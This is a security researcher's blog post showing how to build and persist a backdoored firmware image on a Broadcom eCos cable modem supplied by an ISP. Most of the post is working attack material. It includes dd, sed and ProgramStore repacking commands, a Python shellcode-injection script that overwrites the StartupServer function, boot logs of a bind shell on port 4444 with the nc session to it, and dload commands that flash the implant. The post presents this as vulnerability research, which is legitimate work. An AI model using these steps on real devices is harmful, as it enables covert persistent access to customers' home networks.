---
layout: post
title: Broadcom eCos | Gaining Persistence with Firmware Implants
description: How to gain persistence with firmware implants on Broadcom eCos.
summary: How to gain persistence with firmware implants on Broadcom eCos.
author: qkaiser
image: /assets/backdoor_by_a_midnight_poem_head.jpg
date: 2021-03-15 09:00:00
tags: [ecos, broadcom, implant, firmware, backdoor]
---

!["Backdoors" by amidnightpoem is licensed under CC BY-NC-SA 2.0]({{site.url}}/assets/backdoor_by_a_midnight_poem_head.jpg)

When I sent out my first vulnerability report for a memory corruption issue affecting a Broadcom based eCos device, the conclusion stated: 

> By chaining these vulnerabilities an attacker can gain unauthorized access to customers LAN (over the Internet or by being in reception range of the access point), fully compromise the router, and leave a persistent backdoor allowing direct remote access to the network.

At that point I was confident that backdooring would be possible but I did not have definitive proof yet. This article will explore how we can achieve that by building a backdoored firmware.

## Firmware Repacking

The first steps to investigate whether we can run a backdoored firmware is to
unpack, modify, repack, and try to run the re-packed firmware.

We have an extracted Broadcom eCos firmware file from the manufacturer ASKEY, provided to Orange Belgium ISP. The first step is to get rid of all the null bytes padding at the end of the file, otherwise ProgramStore repacking will fail.

From the output below, we see that content from *0x01965f50* to *0x06000000* is full of null bytes:

{% highlight sh %}
hexdump -C TCG300-D22F.out | tail
01965ee0  81 96 61 a0 81 37 c5 20  81 96 61 a0 81 37 c5 10  |..a..7. ..a..7..|
01965ef0  81 96 61 a0 81 37 c4 fc  81 96 61 a0 81 37 c4 ec  |..a..7....a..7..|
01965f00  81 96 61 a0 81 37 c4 d8  81 96 61 a0 81 37 c4 c8  |..a..7....a..7..|
01965f10  53 6f 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |So..............|
01965f20  81 96 61 a0 81 37 c5 b8  00 00 00 01 3f ff ff fc  |..a..7......?...|
01965f30  00 00 00 00 81 96 61 a0  81 37 c5 f8 81 96 61 a0  |......a..7....a.|
01965f40  81 37 c6 98 00 00 00 00  00 00 00 00 00 00 00 00  |.7..............|
01965f50  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
06000000
{% endhighlight %}

We can remove them easily with `dd`:

{% highlight sh %}
# TODO: find the beginning of null bytes
# with lots of null bytes at the end, the LZMA decompression fails
# for some reason
dd if=TCG300-D22F.out of=implant.in bs=1 count=26632016 status=progress
{% endhighlight %}

Now let's replace a string in place with `sed`:

{% highlight sh %}
sed -i 's/Orange/Grapes/g' implant.in
{% endhighlight %}

And repack the firmware into a ProgramStore file with Broadcom's utility:

{% highlight sh %}
ProgramStore -d -f implant.in -a 0x80004000 -c 4 -o implant.out
Using LZMA Compression.
before compression: 26632016  after compression: 5438345
Percent Compression = 79.58

Header info
===========
Signature:     0x3350
Control:       0x5
MajorRevision: 0x00
MinorRevision: 0x00
CalendarTime:  1613393501
Filelength:    5438345
LoadAddress:   0x80004000
Filename:      implant.out
Hcs:           0x6bdd
reserved:      0x0
crc:           0xe4468dd6

infilename1:   implant.in
{% endhighlight %}

Now all we have to do is boot the device, go into the bootloader menu by pressing 'p' and run a firmware in RAM from a file loaded over TFTP:

{% highlight asm %}
Enter '1', '2', or 'p' within 2 seconds or take default...
. p

Board IP Address  [192.168.100.1]:
Board IP Mask     [255.255.255.0]:
Board IP Gateway  [0.0.0.0]:
Board MAC Address [00:10:18:ff:ff:ff]:

Internal/External phy? (e/i/a)[a]
Detecting switch, switch_id=0x5075
Switch detected
Using GMAC1, phy 1

Enet link up: 1G full


Main Menu:
==========
  b) Boot from flash
  c) Check DRAM
  g) Download and run from RAM
  d) Download and save to flash
  e) Erase flash sector
  m) Set mode
  s) Store bootloader parameters to flash
  i) Re-init ethernet
  r) Read memory
  w) Write memory
  j) Jump to arbitrary address
  p) Print flash partition map
  E) Erase flash region/partition
  X) Erase all of flash except the bootloader
  z) Reset
TFTP Get Selected
Board TFTP Server IP Address [192.168.100.10]:  
Enter filename [TCG300-D22F.EG00.15.01.OBE.01.05.06-E-161110.bin]: implant.out

Destination: a4000000
Starting TFTP of implant.out from 192.168.100.10
Getting implant.out using octet mode
--snip--
Tftp complete
Received 5438437 bytes

Image 3 Program Header:
   Signature: 3350
     Control: 0005
   Major Rev: 0000
   Minor Rev: 0000
  Build Time: 2021/2/15 12:51:41 Z
 File Length: 5438345 bytes
Load Address: 80004000
    Filename: implant.out
         HCS: 6bdd
         CRC: e4468dd6

WARNING: Signatures do not match!  This may be a bad image!
Image sig = 3350, PID = d22f

Store parameters to flash? [n] n 

--device boots up normally--
{% endhighlight %}

To serve the file, you can use [ptftpd](https://pypi.org/project/ptftpd/):

{% highlight sh %}
sudo iptables -t nat -A PREROUTING -p udp -d 192.168.100.10 --dport 69 -s 192.168.100.1 -j REDIRECT --to-ports 6969
ptftpd -v -p 6969 eno1 `pwd`
{% endhighlight %}

The device boots normally, our changed string is visible, this means that neither the bootloader or the operating system enforce firmware authenticity checks or secure boot.

We can move on and try to insert an actual backdoor into the firmware.


### Arbitrary Code Injection

I identified one interesting function that I had renamed 'StartupServer'. This function performs some operations related to remote console access via telnet, but is not crucial to the device operation. 

The function spans from offset *0x805f4434* to *0x805f4b28*, and the idea will be to overwrite that section with our own custom payload.

The payload I designed will launch a thread named 'payload', exposing a bind shell on port 4444:

{% highlight c %}


{% endhighlight %}

We need to edit the linker script and put the right offset, which corresponds to the start address of *StartupServer* function:

{% highlight c %}
SECTIONS
{
  . = 0x805f4434;
  .start : { *(.start) }
  .text : { *(.text) }
  .data : { *(.data) }
  .rodata : { *(.rodata) }
}
{% endhighlight %}


I wrote this quick and dirty Python script to overwrite a given section with custom shellcode:

{% highlight python %}
#!/usr/bin/env python3
import sys

LOAD_ADDRESS = 0x80004000

if __name__ == "__main__":

    if len(sys.argv) < 5:
        print("Usage: {} firmware shellcode start end")
        sys.exit(-1)

    firmware_file = sys.argv[1]
    shellcode_file = sys.argv[2]
    start_offset = int(sys.argv[3], 16) - LOAD_ADDRESS
    end_offset = int(sys.argv[4], 16) - LOAD_ADDRESS

    available_space = end_offset - start_offset

    print("Available space: {} bytes".format(available_space))

    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()

    if len(shellcode) > available_space:
        print("Not enough available space to fit shellcode")
        sys.exit(-1)

    padding = b"\x00" * (available_space - len(shellcode))

    print("Overwriting firmware file with shellcode.")
    with open(firmware_file, 'r+b') as f:
        f.seek(start_offset)
        f.write(shellcode)
        f.write(padding)
{% endhighlight %}


Let's inject our shellcode:

{% highlight sh %}
cp implant.in implant.shellcode
./inject.py implant.shellcode ~/git/ecoshell/bindshell_thread.bin 0x805f4434 0x805f4b28
Available space: 1780 bytes
Overwriting firmware file with shellcode.
{% endhighlight %}

We repack it, serve it over TFTP and let it boot. As we can see from the boot logs below, our malicious code is executing successfully.

Note that if we wanted our code to run in a single window without being prempted by the scheduler, we could add calls to `cyg_scheduler_lock` and `cyg_scheduler_unlock`. This way our logs would no longer be spread around in the boot logs :)

{% highlight asm %}
--boot--
ItcRxThreadCreating SNMP agent eRouter Proxy Agent
eRouter Proxy Agent disabling management.
eRouter Proxy Agent deferring traps.
Enabling SNMP proxy
Vendor CM Agent w/ BRCM Factory Support destroying notifies...
[!] LAUNCHING BACKDOOR
Warning: service [: Current IP address is default 0.0.0.0.

Configuring IP stack 2:  IP Address = 192.168.100.1
[+] Launching bind shell on 0.0.0.0:4444
--snip--
[00:00:19 01/01/1970] [tStartup] BcmNonVolDeviceDriverBridge::WriteSync:  (NonVol Device) Synchronous write to dynamic nonvol section succeeded
BcmSnmpThread starting thread operation.
Received RG Event 0x80000001 State 0x0
Received eRouter BOOTED event from RG
Enabling SNMP proxy
Initializing Net-SNMP transport for IPv4
Initializing Net-SNMP transport for IPv6
SNMP startup complete.
SpecA - IP Stack address is 0.0.0.0
mongoose set_ports_option: listening on:(IPv4) 0.0.0.0; port:8080
[+] bind successful
--snip--
AVS Thread Start:Arming poll timer....
NvPollMilliseconds = 1000
RMON = 1.042, sigma = 0.702
[+] listen successful0PMC AVS Thread Start: Done.
{% endhighlight %}

The device is fully functional, and we have a bind shell:

{% highlight asm %}
nc 192.168.22.1 4444
ls
!               ?               REM             call            cd
dir             find_command    help            history         instances
ls              man             pwd             sleep           syntax
system_time     usage
----
btcp            con_high        cpuLoad         cpuUtilization  exit
mbufShow        memShow         mutex_debug     ping            read_memory
reset           routeShow       run_app         shell           socket_debug
stackShow       taskDelete      taskInfo        taskPrioritySet taskResume
taskShow        taskSuspend     taskSuspendAll  taskTrace       version
write_memory    zone
----
[80211_hal] [Console] [HeapManager] [HostDqm] [cablemedea] [eRouter]
[embedded_target] [enet_hal] [fam] [forwarder] [ftpLite] [httpClient]
[ip_hal] [itc_hal] [msgLog] [non-vol] [pingHelper] [power] [snmp] [snoop]
[tr69]
{% endhighlight %}

Our malicious thread (payload) is visible:

{% highlight asm %}
CM> taskShow

  TaskId               TaskName              Priority   State
---------- --------------------------------  --------  --------
--snip--
0x84d4b358                  eRouterMsgPipe      23       SLEEP
0x84d451f4                     Trap Thread      23       SLEEP
0x84d2d7e4              CmPropaneCtlThread      23       SLEEP
0x84d26e94                     IGMP Thread      23       SLEEP
0x805f4a78                         payload      23       SLEEP
0x84d23304               NetToMedia Thread      23       SLEEP
0x84e67b24                     SNMP Thread      23       SLEEP
0x84b623e8                HttpServerThread      23       SLEEP
--snip--
{% endhighlight %}

This device is quite unique in that it runs on two cores, one dedicated to cable modem work (CM) and the other dedicated to network routing (RG). Each of them expose a specific console, and you need to run code from a specific context to execute within CM or RG. Interestingly, we have two functions named StartupServer:

- offsets: 0x805f4434 - 0x805f4b28 (CM)
- offsets: 0x805d4624 - 0x805d4d18 (probably RG)

So if you are targeting a Broadcom device that expose two consoles (these are rare), and that you really want to gain access to both, you'd have to also replace the second function. We can imagine the CM console exposed on port TCP/4444 and the RG console exposed on port TCP/5555.

### Implant Writing Shellcode

I was initially planning on writing my own client to write the backdoored firmware to flash when I found out that broadcom devices implement multiple update commands:

- **CM/ip_hal/dload** - download and save firmware to flash (IP controller) 
- **CM/docsis_ctl/dload** - download and save firmware to flash (CMTS controller)
- **CM/ip_hal/bootloader** - download and save bootloader to flash (IP controller)
- **CM/docsis_ctl/bootloader** - download and save bootloader to flash (CMTS controller)

{% highlight asm %}
CM/IpHal> help dload

COMMAND:  dload

USAGE:  dload  [-i Number] [-l] [-f] IpAddress Filename{255}

DESCRIPTION:
Downloads the specified s/w image from the TFTP server and stores it in the
image slot specified.  The image must be valid for the platform, and must not
contain any security, encryption, or digital signatures.  It must be a simple
image file with only the normal ProgramStore compression header.  Parameters:

  -i  -- Specifies the image slot to store the image to.
  -l  -- Allows a large image to be stored, spanning images 1 and 2, if
         allowed by the flash driver configuration.
  -f  -- Forces the given image to be accepted, as long as the CRCs are
         valid.

Note that you must always specify the TFTP server address and filename;
unlike the dload command in the Docsis directory, this command doesn't make
use of any Docsis-specific nonvol settings, so it can't remember the last
values used.

EXAMPLES:
dload 11.24.4.3 vxram_sto.bin       -- Stores the image to the default image
                                       slot.
dload -i 1 11.24.4.3 vxram_sto.bin  -- Store the image to slot 1.
{% endhighlight %}

Sample run:

{% highlight asm %}
CM/IpHal> dload -i2 192.168.100.10 implant.out


WARNING:  This will be applied to all 10 registered instances!
Do you really want to do this? (yes|no) [no] yes

Instance (0):  IP Stack1 (0x84d735bc)

Selecting IP stack 2 (statically configured).
Opening file 'implant.out' on 192.168.100.10 for reading...
[00:06:38 01/01/1970] [ConsoleThread] Tftp Client::GetReply:  (Tftp Client) Timed out on socket select!
[00:06:38 01/01/1970] [ConsoleThread] Tftp Client::Send:  (Tftp Client) Attempt #(1) Backoff (1) Exp Block #(1) Last Block #(0) Recv'd Block #(0)
[00:06:38 01/01/1970] [ConsoleThread] Tftp Client::Send:  (Tftp Client) TFTP blocksize value returned by server: 1448
Reading from TFTP server...
Sniffing the image header...
ProgramStore header was verified.  Image can be downloaded.
[00:06:38 01/01/1970] [ConsoleThread] BcmProgramStoreDeviceDriverBridge::Open:  (Program Store Device) 
Opening image number 2.
Storing data to the device...
Reading from TFTP server...
Storing data to the device...
--snip--
Tftp read < 1448 bytes, we have reached end of file.
Tftp transfer complete!
TFTP Settings:
            Stack Interface = 2
          Server Ip Address = 192.168.100.10
         Server Port Number = 69
          Total Blocks Read = 3756
           Total Bytes Read = 5438437

Storing data to the device...
NandFlashWrite warning: Request to write partial page!  offset 3b20000, length 64485
0x9907a Computing CRC32 over the image to ensure that it is valid...
NandFlashRead: Detected out-of-order block @offset 0x3b30000, tagged offset 0xffffff00, expected offset 0x530000
NandFlashRead: Failed to find replacement block!
{% endhighlight %}

Bootloader:

{% highlight asm %}
CM/IpHal> help bootloader

COMMAND:  bootloader

USAGE:  bootloader  [-f] IpAddress Filename{255}

DESCRIPTION:
Downloads the specified bootloader image from the TFTP server and stores it
to the bootloader region.  The image must be valid for the platform, and must
have a ProgramStore header (but no compression).

EXAMPLES:
bootloader 11.24.4.3 bootloader3360_2_1_2_c0.bin     -- Upgrades the
                                                        bootloader.
bootloader -f 11.24.4.3 bootloader3360_2_1_2_c0.bin  -- Accepts a bootloader
                                                        with non-matching
                                                        signature.
{% endhighlight %}

## Conclusion

Over the course of this article, we learned how to unpack, implant, and repack a Broadcom eCos firmware file. We then explored ways of running our malicious firmware file, loading over TFTP and running on RAM for debugging purposes, and writing to NAND flash for persistence.

We therefore proved our initial hypothesis that said "and leave a persistent backdoor allowing direct remote access to the network". 

As always, if you have any question feel free to contact me via [Twitter](https://twitter.com) or [email](mailto:quentin@ecos.wtf).
